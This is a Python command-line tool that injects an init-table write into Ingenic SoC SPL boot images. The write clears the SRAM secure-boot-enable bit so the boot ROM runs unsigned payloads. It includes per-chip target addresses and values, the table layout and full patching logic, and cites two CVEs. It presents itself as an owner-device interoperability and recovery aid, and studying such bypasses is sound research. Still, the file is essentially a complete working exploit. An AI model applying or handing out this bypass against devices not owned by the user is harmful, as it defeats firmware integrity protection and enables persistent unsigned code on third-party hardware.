#!/usr/bin/env python3
"""Inject an Ingenic boot-ROM init-table secure-boot bypass into an SPL image.

What this does
--------------
The mask boot ROM on several Ingenic SoCs (T23, T32, T40, T41, A1) parses an
optional *init table* out of the SPL/TPL header **before** it decides whether
to cryptographically verify the payload. Each table entry is a direct
``*(address) = value`` write the ROM performs against live SRAM. The ROM keeps
its eFuse-derived secure-boot configuration in that same SRAM and reads it
*after* running the table, so one header-controlled write that clears the
secure-boot-enable bit disables verification for that boot -- the payload then
runs unsigned.

This is the very mechanism the stock vendor firmware uses (the factory NOR
image ships an identical init-table write), which makes it an interoperability
lever for running owner-controlled open-source firmware (e.g. thingino) on
these parts. It is not a crypto break: the RSA/PSS verifier is left intact,
merely skipped.

Init-table binary layout
------------------------
The table lives in the boot-block header. On XBurst2 SoCs (T32/T40/T41/A1),
the ROM uses header+0x100 for BOTH NOR and SD boot (verified via QEMU bootrom
emulation -- the ``addiu a0,a0,256`` delay slot fires on all code paths). On
XBurst1 T23, the SD/MSC boot path reads at header+0x40 instead (pass --sd).
Relative to the magic word::

    +0x00  u32   magic 'INGE' (0x45474e49) -- presence flag the ROM tests
    +0x04  u32   image size / reserved (ROM-specific; preserved, not synthesised)
    +0x20  entry[0]         entries are five u32 words (0x14 bytes) each:
             +0x00 u32  write address
             +0x04 u32  poll  address   (0xffffffff => plain write, no poll)
             +0x08 u32  write value
             +0x0c u32  poll  mask
             +0x10 u32  poll  clear
    ...    entry[n]
    <end>  an entry whose write *and* poll address are both 0xffffffff ends it

Only one write is required for the bypass. Any entries already present (for
example a vendor DDR/clock table) are parsed and preserved -- this tool appends
its write and never blindly clobbers a populated table, and it leaves the
table header words (some ROMs read an image size there) untouched.

Per-SoC targets
---------------
``SOC_TARGETS`` maps each SoC to the SRAM word holding its secure-boot-enable
bit, the value that clears it, and where its init table lives, along with how
well that pair is proven.

Scope
-----
Two SoCs are deliberately excluded:
  * T31 -- its init parser masks addresses into the 0xB000xxxx peripheral range,
    so the SRAM clobber cannot reach the secure byte. T31 is handled by the
    separate ingenic_t31_spl_patcher.py (signature collision).
  * everything without the strong-verifier + SRAM-writable init parser combo.
T23 *is* supported: despite being XBurst1 like T31, its ROM has the strong
32-byte PSS verifier and an unmasked init parser -- i.e. it is a T32-class
init-table target, just at a different table offset.

References
----------
  * https://www.cve.org/CVERecord?id=CVE-2026-50719
  * https://www.cve.org/CVERecord?id=CVE-2026-50720

Intended for authorized interoperability and recovery on hardware you own.
"""

from __future__ import annotations

import argparse
import hashlib
import struct
import sys
from dataclasses import dataclass, replace
from pathlib import Path

# --- Boot-ROM-defined layout constants (see module docstring) --------------
INIT_MAGIC = 0x45474E49          # 'INGE', little-endian
MSPL_MAGIC = 0x4D53504C          # 'MSPL' (LE 'LPSM'); starts an SD/USB raw SPL
TABLE_HEADER_SIZE = 0x20         # magic word .. first entry (magic + size/reserved)
ENTRY_SIZE = 0x14                # five u32 words per entry
NO_POLL = 0xFFFFFFFF             # sentinel in an entry's poll-address slot
TERMINATOR = 0xFFFFFFFF          # write/poll address value that ends the table

# The ROM parses the init table at a boot-source-specific offset (verified in the
# verified in the t23n/t32lq/t40nn/t41nq/a1n boot ROMs -- same parser, two call sites per SoC):
#   NOR/SFC boot -> SPL+0x100 (all SoCs)
#   SD/MSC boot  -> SPL+0x100 (XBurst2: T32/T40/T41/A1) or SPL+0x40 (T23 only)
SD_MAGIC_OFFSET = 0x40
SD_TABLE_LIMIT = 0x80

# Empirical Ingenic load-header signature: bytes 5..8 of a ROM-loadable SPL
# image are 55 aa 55 aa (observed on XBurst1 T32 vendor and thingino images).
# A plain u-boot.bin starts with MIPS code and fails this check -- which is
# exactly the "patched the wrong file" mistake this guards against. Confirmed on
# XBurst1; pass --no-header-check for images whose header has not been verified.
HEADER_SIGNATURE = bytes((0x55, 0xAA, 0x55, 0xAA))
HEADER_SIGNATURE_OFFSET = 5


@dataclass(frozen=True)
class SocTarget:
    """A SoC's secure-boot-enable location, the value that clears it, and where
    its init table sits.

    ``confidence`` records how far each entry has been proven:
        hardware -- booted unsigned on real silicon in this lab
        reported -- documented working in our notes, not re-tested here
        analysis -- derived from ROM disassembly only; verify before trusting

    ``magic_offset`` / ``table_limit`` locate the init table within the boot
    block and bound it (the table must end before the next header region -- the
    RSA key/signature). They default to the T32 family's layout.
    """

    write_addr: int
    write_value: int
    confidence: str
    note: str
    magic_offset: int = 0x100
    table_limit: int = 0x200
    sd_magic_offset: int | None = None
    sd_table_limit: int | None = None


# Secure byte -> containing 32-bit word, the value that clears the enable bit,
# and the init-table position. Derived from boot ROM analysis.
SOC_TARGETS: dict[str, SocTarget] = {
    "t23": SocTarget(
        0x8000007C, 0x00000000, "analysis",
        "zeroes the word holding secure byte 0x7d (bit0 = secure enable)",
        sd_magic_offset=0x40, sd_table_limit=0x80,
    ),
    "t32": SocTarget(
        0x80000024, 0x00000000, "hardware",
        "zeroes *0x80000024, clearing secure-enable bit 0x10000",
    ),
    "t40": SocTarget(
        0x800000B0, 0x00004000, "analysis",
        "byte 0xb1 <- 0x40: clears secure bit0, keeps alt-path bit 0x40 "
        "(ROM tests (*0xb1 & 0x41) == 0x41)",
    ),
    "t41": SocTarget(
        0x80000090, 0x00000000, "reported",
        "zeroes the word holding secure byte 0x91 (bit0 = secure enable)",
    ),
    "a1": SocTarget(
        0x800000B0, 0x00000000, "analysis",
        "zeroes the word holding secure byte 0xb1 (bit0 = secure enable)",
    ),
}


class ImageError(Exception):
    """A condition that should abort patching with a user-facing message."""


@dataclass
class InitEntry:
    """One init-table write. Defaults describe a plain write with no polling."""

    write_addr: int
    write_value: int
    poll_addr: int = NO_POLL
    poll_mask: int = 0
    poll_clear: int = 0

    def pack(self) -> bytes:
        # Field order is ROM-defined: addr, poll_addr, value, poll_mask, poll_clear.
        return struct.pack(
            "<IIIII",
            self.write_addr, self.poll_addr, self.write_value,
            self.poll_mask, self.poll_clear,
        )

    @classmethod
    def unpack(cls, raw: bytes) -> InitEntry:
        addr, poll_addr, value, poll_mask, poll_clear = struct.unpack("<IIIII", raw)
        return cls(addr, value, poll_addr, poll_mask, poll_clear)


def parse_existing_entries(
    data: bytes, boot_offset: int, target: SocTarget,
) -> list[InitEntry]:
    """Return the init-table entries already in the image, or [] if none.

    Returns [] when the INGE magic is absent. Otherwise reads entries until the
    terminator (write address 0xffffffff) or the table limit, whichever is first.
    """
    magic_at = boot_offset + target.magic_offset
    if struct.unpack_from("<I", data, magic_at)[0] != INIT_MAGIC:
        return []

    entries: list[InitEntry] = []
    offset = magic_at + TABLE_HEADER_SIZE
    limit = boot_offset + target.table_limit
    while offset + ENTRY_SIZE <= limit:
        entry = InitEntry.unpack(data[offset:offset + ENTRY_SIZE])
        if entry.write_addr == TERMINATOR:
            break
        entries.append(entry)
        offset += ENTRY_SIZE
    return entries


def region_is_blank(data: bytes, boot_offset: int, target: SocTarget) -> bool:
    """True if the header + first-entry slot of the init table is entirely zero."""
    start = boot_offset + target.magic_offset
    end = start + TABLE_HEADER_SIZE + ENTRY_SIZE
    return not any(data[start:end])


def check_header(data: bytes, boot_offset: int, sd: bool) -> None:
    """Raise ImageError unless the boot block looks like the expected SPL.

    NOR/SFC images carry the load-header signature (55 aa 55 aa at +5); SD/USB
    images are MSPL-format (MSPL magic at the boot offset).
    """
    if sd:
        if struct.unpack_from("<I", data, boot_offset)[0] != MSPL_MAGIC:
            raise ImageError(
                f"no MSPL magic (4d53504c) at offset 0x{boot_offset:x} for --sd. An "
                "SD SPL starts with MSPL; in a full SD image it sits at block 34, so "
                "pass --boot-offset 0x4400. Or --no-header-check to skip."
            )
        return
    start = boot_offset + HEADER_SIGNATURE_OFFSET
    if data[start:start + len(HEADER_SIGNATURE)] != HEADER_SIGNATURE:
        raise ImageError(
            "no Ingenic boot-ROM load-header signature (55 aa 55 aa) at "
            f"offset 0x{start:x}. This usually means the wrong file -- patch the "
            "ROM-loadable SPL image (e.g. u-boot-with-tpl-lzma.bin), not a bare "
            "u-boot.bin. Use --sd for an SD/MSC image, or --no-header-check if this "
            "is a confirmed image whose header differs."
        )


def inject(
    data: bytearray, boot_offset: int, target: SocTarget,
    addr: int, value: int, force: bool,
) -> tuple[str, list[InitEntry]]:
    """Add the bypass write to the image's init table in place.

    Preserves the table header words and any existing entries. Returns
    (status, entries): "present" if the write was already there (image left
    unchanged) or "patched" if it was appended.
    """
    magic_at = boot_offset + target.magic_offset
    existing = parse_existing_entries(data, boot_offset, target)

    if any(e.write_addr == addr and e.write_value == value for e in existing):
        return "present", existing

    has_table = struct.unpack_from("<I", data, magic_at)[0] == INIT_MAGIC
    if not has_table and not region_is_blank(data, boot_offset, target) and not force:
        raise ImageError(
            f"the init-table slot at 0x{magic_at:x} is not blank and holds no "
            "INGE table; refusing to overwrite it (it may be code from the wrong "
            "file, or an unrecognised layout). Use --force to override."
        )

    entries = existing + [InitEntry(addr, value)]

    # Keep the existing header bytes (a ROM may read an image size at +0x04),
    # forcing only the magic. On a blank slot this region is already zero, so a
    # fresh table becomes magic + zero header.
    header = bytearray(data[magic_at:magic_at + TABLE_HEADER_SIZE])
    struct.pack_into("<I", header, 0, INIT_MAGIC)

    table = bytes(header)
    table += b"".join(entry.pack() for entry in entries)
    table += struct.pack("<II", TERMINATOR, TERMINATOR)   # 2 words = all the ROM reads

    end = target.magic_offset + len(table)
    if end > target.table_limit:
        raise ImageError(
            f"init table would reach 0x{end:x}, past the 0x{target.table_limit:x} "
            f"limit ({len(entries)} entr{'y' if len(entries) == 1 else 'ies'}; no "
            "room before the RSA/key region)"
        )

    data[magic_at:magic_at + len(table)] = table
    return "patched", entries


def default_output(input_path: Path, soc: str) -> Path:
    return input_path.with_name(f"{input_path.stem}-{soc}-init-bypass{input_path.suffix}")


def anyint(text: str) -> int:
    """argparse type for integers accepting 0x / 0o / decimal."""
    return int(text, 0)


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description=__doc__.splitlines()[0],
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="Authorized interoperability / recovery use on hardware you own.",
    )
    parser.add_argument("input", type=Path, help="SPL image to patch")
    parser.add_argument(
        "--soc", required=True, choices=sorted(SOC_TARGETS),
        help="target SoC (selects the secure-config address, value and table offset)",
    )
    parser.add_argument(
        "-o", "--output", type=Path,
        help="output path (default: <input>-<soc>-init-bypass<ext>)",
    )
    parser.add_argument(
        "--boot-offset", type=anyint, default=0, metavar="OFF",
        help="offset of the boot block within a larger image (default: 0; for a "
             "full SD image the SPL is at block 34 -> 0x4400)",
    )
    parser.add_argument(
        "--sd", action="store_true",
        help="target SD/MSC boot instead of NOR/SFC: the ROM parses the init table "
             "at SPL+0x40 (not +0x100) and the SPL is MSPL-format",
    )
    parser.add_argument(
        "--addr", type=anyint, metavar="ADDR",
        help="override the target write address for the selected SoC",
    )
    parser.add_argument(
        "--value", type=anyint, metavar="VAL",
        help="override the value written to the target address",
    )
    parser.add_argument(
        "--no-header-check", action="store_true",
        help="skip the boot-ROM header signature check",
    )
    parser.add_argument(
        "--force", action="store_true",
        help="overwrite a non-blank slot that holds no INGE table",
    )
    parser.add_argument(
        "--dry-run", action="store_true",
        help="report what would change without writing an output file",
    )
    return parser


def report(
    *, input_path: Path, output_path: Path, soc: str, target: SocTarget,
    addr: int, value: int, boot_offset: int, is_sd: bool, status: str,
    entries: list[InitEntry], data: bytes, wrote: bool,
) -> None:
    """Print a human-readable summary to stdout."""
    verb = {"patched": "added bypass write", "present": "already bypassed"}[status]
    print(f"input:       {input_path}")
    print(f"output:      {output_path if wrote else '(not written)'}")
    print(f"soc:         {soc}  [{target.confidence}]")
    print(f"result:      {verb}")
    print(f"target:      *0x{addr:08x} = 0x{value:08x}")
    print(f"note:        {target.note}")
    medium = "SD/MSC" if is_sd else "NOR/SFC"
    print(f"table at:    boot+0x{target.magic_offset:x} ({medium} boot)"
          + (f", boot_offset 0x{boot_offset:x}" if boot_offset else ""))
    print(f"init table:  {len(entries)} entr{'y' if len(entries) == 1 else 'ies'}")
    for i, entry in enumerate(entries):
        poll = "" if entry.poll_addr == NO_POLL else f"  poll *0x{entry.poll_addr:08x}"
        print(f"  [{i}] *0x{entry.write_addr:08x} = 0x{entry.write_value:08x}{poll}")
    print(f"size:        {len(data)} bytes (0x{len(data):x})")
    print(f"sha256:      {hashlib.sha256(data).hexdigest()}")


def main(argv: list[str] | None = None) -> int:
    args = build_parser().parse_args(argv)

    try:
        target = SOC_TARGETS[args.soc]
        if args.sd:
            sd_off = target.sd_magic_offset
            sd_lim = target.sd_table_limit
            if sd_off is not None:
                target = replace(target, magic_offset=sd_off,
                                 table_limit=sd_lim or SD_TABLE_LIMIT)
            # XBurst2 SoCs (T32/T40/T41/A1) use +0x100 for both NOR and SD;
            # only T23 (XBurst1) has a distinct SD offset at +0x40.
        addr = target.write_addr if args.addr is None else args.addr
        value = target.write_value if args.value is None else args.value

        if not args.input.is_file():
            raise ImageError(f"input image not found: {args.input}")
        data = bytearray(args.input.read_bytes())

        if not args.no_header_check:
            check_header(data, args.boot_offset, args.sd)

        status, entries = inject(data, args.boot_offset, target, addr, value, args.force)

        # Surface anything that has not been proven on silicon.
        if target.confidence != "hardware" and args.addr is None and args.value is None:
            print(
                f"warning: the '{args.soc}' preset is '{target.confidence}', not "
                "hardware-validated in this lab; confirm on your unit",
                file=sys.stderr,
            )

        output_path = args.output or default_output(args.input, args.soc)

        # Write when there is a change to persist, or when an explicit output was
        # requested (so --output always produces a file, even if idempotent).
        wrote = False
        if args.dry_run:
            print("(dry run: no file written)", file=sys.stderr)
        elif status == "patched" or args.output is not None:
            output_path.write_bytes(data)
            wrote = True
        else:
            print("no change: bypass write already present", file=sys.stderr)

        report(
            input_path=args.input, output_path=output_path, soc=args.soc,
            target=target, addr=addr, value=value, boot_offset=args.boot_offset,
            is_sd=args.sd, status=status, entries=entries, data=data, wrote=wrote,
        )
        return 0

    except (ImageError, OSError) as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 2


if __name__ == "__main__":
    raise SystemExit(main())
